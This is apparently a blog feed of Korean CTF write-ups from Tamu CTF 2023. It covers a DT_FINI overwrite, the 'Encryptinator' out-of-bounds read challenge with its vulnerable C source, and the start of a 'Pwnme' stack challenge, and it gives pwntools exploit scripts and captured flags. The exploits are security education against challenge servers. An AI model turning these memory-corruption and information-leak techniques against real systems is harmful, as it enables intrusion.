ÏΩîÎìúÎßå Î≥¥Í≥† Ï∑®ÏïΩÏ†êÏùÑ Î∞îÎ°ú Î™ªÏ∞æÏïòÎã§. Í∑∏ÎûòÏÑú ÎîîÎ≤ÑÍπÖÌïòÎ©¥ÏÑú ÌÑ∞ÏßÄÎäî Î∂ÄÎ∂ÑÏùÑ Ï∞æÏïÑÎ¥§Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov    QWORD PTR [rax], rdx</span><br></pre></td></tr></table></figure><p>ÏúÑ Ïù∏Ïä§Ìä∏Îü≠ÏÖòÏóêÏÑú ÌÑ∞Ï°åÍ≥†, Ï†Ä Í∞íÎì§ÏùÄ ÎÇòÏùò ÏûÖÎ†•Í∞íÏù¥ÏóàÎã§. Ïù¥Í≤ÉÏùÑ Î∞îÌÉïÏúºÎ°ú Ïñ¥ÎîîÏóê <code>win</code> Ìï®Ïàò Ï£ºÏÜåÎ•º Ïì∏ ÏßÄ Í≥†ÎØºÌñàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><code>NO RELRO</code>Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000403248                 Elf64_Dyn &lt;0Dh, 4012D4h&gt; ; DT_FINI</span><br></pre></td></tr></table></figure><p>ÌîÑÎ°úÍ∑∏Îû®Ïù¥ Ï¢ÖÎ£åÎê† Îïå Ìò∏Ï∂úÎêòÎäîÎç∞ Ïó¨Í∏∞Ïóê ÎçÆÏúºÎ©¥ ÎêúÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;randomness&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./randomness&#x27;)</span></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./randomness&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;seed:&#x27;</span>, <span class="string">&#x27;4207176&#x27;</span>)<span class="comment">#  0x403248</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;guess:&#x27;</span>, <span class="string">&#x27;4198867&#x27;</span>) <span class="comment">#&#x27;0x4011D3&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;value_or_pointer_is_an_important_distinction&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fini </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Encryptinator (pwn, oob read)</title>
      <link href="/230503-tamu2023-7.Encryptinator-pwn/"/>
      <url>/230503-tamu2023-7.Encryptinator-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I have made this super secure encryption engine. I‚Äôll encrypt any message and no one will ever be able to read it. Not even me!<br>Author: <code>_mac_</code></p></blockquote><ul><li>[31 solves &#x2F; 491 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ ÏÜåÏä§ÏΩîÎìúÎ•º Ï†úÍ≥µÌï¥Ï§ÄÎã§. libcÎèÑ Ï†úÍ≥µÌï¥Ï§¨Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_LEN 30</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">char</span>* iv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[len];</span><br><span class="line">    FILE *file;</span><br><span class="line">    </span><br><span class="line">    file = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(key, len, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">randomize</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">long</span> seed, <span class="type">unsigned</span> <span class="type">long</span> iterations)</span> &#123;</span><br><span class="line">    seed = seed * iterations + len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iterations &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        randomize(msg, len, seed, iterations- <span class="number">1</span>); <span class="comment">// Ïã§ÌñâÏãúÏºúÏïº Ïä§ÌÉùÏù¥ ÎÜíÏïÑÏ†∏ÏÑú print_hexÌï† Îïå encryptÌï®ÏàòÏùò key Í∞íÏù¥ ÎÇ®ÏïÑÏûàÏùå</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        encrypt(msg, len, ((<span class="type">char</span> *) &amp;seed)); <span class="comment">// ÏïàÍ∑∏Îü¨Î©¥ key Í∞íÏù¥ ÎçÆÌòÄÏÑú ÏïàÎ≥¥ÏûÑ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> option;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nSelect from the options below:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. Encrypt a message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. View the encrypted message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. Quit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;option);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">console</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">long</span> seed;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> read_len;</span><br><span class="line">    <span class="type">char</span> buf[MAX_LEN] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(menu()) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">// get user input</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter message to encrypt: &quot;</span>);</span><br><span class="line">                fgets(buf, MAX_LEN-FLAG_LEN, <span class="built_in">stdin</span>);</span><br><span class="line">                len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add flag to the buffer</span></span><br><span class="line">                file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">                fread(buf + len, FLAG_LEN, <span class="number">1</span>, file);</span><br><span class="line">                fclose(file);</span><br><span class="line">                len += FLAG_LEN;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// encrypt</span></span><br><span class="line">                seed = ((<span class="type">long</span>) rand()) &lt;&lt; <span class="number">32</span> + rand();</span><br><span class="line">                randomize(buf, len, seed, buf[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span>(len == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you need to encrypt a message first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                index = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nRead a substring of the encrypted message.&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter the starting index (%d - %d): &quot;</span>, index, len);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">                <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (index &gt; len) &#123; </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error, index out of bounds.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your encrypted string with the flag:\n&quot;</span>);</span><br><span class="line">                print_hex(buf+index, len - index); <span class="comment">// oob read</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;goodbye.\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;There was an error processing that request, please try again.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>)); </span><br><span class="line">    upkeep();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// welcome</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my encryption engine: ENCRYPT-INATOR!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll encrypt anything you want but no guarantees you&#x27;ll be able to decrypt it,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I haven&#x27;t quite figured out how to do that yet... :(\n&quot;</span>); </span><br><span class="line">    console();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2Î≤à Î©îÎâ¥ÏóêÏÑú <code>index</code>Í∞Ä ÏùåÏàòÍ∞Ä Í∞ÄÎä•ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>print_hex(buf+index, len - index);</code>ÏóêÏÑú <code>oob</code>Í∞Ä Î∞úÏÉùÌï† Ïàò ÏûàÎã§. <code>buf</code> Ïù¥Ï†ÑÏóê ÏûàÎäî Í≤ÉÏùÑ Ï∂úÎ†•Ìï† Ïàò ÏûàÎã§. Ïù¥Í≤ÉÏúºÎ°ú <code>seed</code>ÏôÄ <code>key</code>Î•º Íµ¨Ìï† Ïàò ÏûàÎã§.</p><p>ÏÇ¨Ïã§ÏÉÅ <code>seed</code>ÏôÄ <code>key</code>Îßå ÏïåÎ©¥ <code>flag</code>Îäî Î∞îÎ°ú Íµ¨Ìï† Ïàò ÏûàÏùÑ Í≤É Í∞ôÎã§. Ï∞∏Í≥†Î°ú encryptÎêú flagÎèÑ <code>print_hex(buf+index, len - index);</code>Î•º ÌÜµÌï¥ÏÑú Î∞îÎ°ú Íµ¨Ìï† Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê ÎãπÏó∞Ìûà <code>flag</code>Î•º Í≥ÑÏÇ∞Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">    msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>xor</code>ÏùÑ Ìïú Î≤à Îçî ÏßÑÌñâÌïòÎ©¥ ÎêúÎã§.</p><p><code>key</code>Î•º leakÌï† Îïå Ï£ºÏùòÌï¥ÏïºÌï† Í≤ÉÏù¥ ÏûàÎã§. Ï£ºÏÑùÏóêÎèÑ Ïç®ÎÜ®ÎìØÏù¥ <code>randomize()</code> Ìï®ÏàòÏóêÏÑú <code>iteration</code>Ïù¥ 1 Ïù¥ÏÉÅÏù¥Ïñ¥Ïïº <code>randomize(msg, len, seed, iterations- 1);</code> ÏùÑ Ìïú Î≤à Îçî Ìò∏Ï∂úÌïòÎäîÎç∞, Ïù¥Î†áÍ≤å Ìï¥ÏïºÏßÄ stackÏù¥ ÎÜíÏïÑÏ†∏ÏÑú <code>key</code> Í∞íÏù¥ ÎÇ®ÏïÑÏûàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;encryptinator&quot;</span>) </span><br><span class="line"><span class="comment"># p = process(&#x27;./encryptinator&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./encryptinator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4800</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line">key_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key_leak&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key_leak))</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    key.append(<span class="built_in">int</span>(key_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4648</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">seed_leak = p.recvline()[:<span class="number">8</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed_leak))</span><br><span class="line"></span><br><span class="line">seed = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>):</span><br><span class="line">    seed.append(<span class="built_in">int</span>(seed_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">flag_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    flag.append(<span class="built_in">int</span>(flag_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    flag[i] = flag[i] ^ key[i] ^ seed[i % <span class="number">8</span>]</span><br><span class="line">    real_flag.append(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;####&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">&#x27;&#x27;</span>.join(real_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(real_flag))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;00ps_b4d_3rr0r_ch3ck1ng&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Pwnme (pwn, sub rsp, 0x18)</title>
      <link href="/230503-tamu2023-8.Pwnme-pwn/"/>
      <url>/230503-tamu2023-8.Pwnme-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>pwn me. that‚Äôs it.<br>Author: <code>_mac_</code></p></blockquote><ul><li>[26 solves &#x2F; 494 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ Ïª§Ïä§ÌÖÄÎùºÏù¥Î∏åÎü¨Î¶¨Î•º Ï†úÍ≥µÌï¥Ï§ÄÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨Îäî ÏúÑÏôÄ Í∞ôÎã§. Ïª§Ïä§ÌÖÄÎùºÏù¥Î∏åÎü¨Î¶¨Ïùò Ìï®ÏàòÎ•º ÌïòÎÇò Ìò∏Ï∂úÌï¥Ï£ºÍ≥† ÎÅùÎÇúÎã§. <code>puts</code> Í∞ôÏùÄ Í≤ÉÎèÑ ÏóÜÏñ¥ÏÑú Ï†ïÎßê Ìï† Í≤ÉÏù¥ ÏóÜÎã§. </p><p>Ïª§Ïä§ÌÖÄÎùºÏù¥Î∏åÎü¨Î¶¨ÏóêÎäî ÏïÑÎûò Ìï®ÏàòÍ∞Ä ÎÅùÏù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] 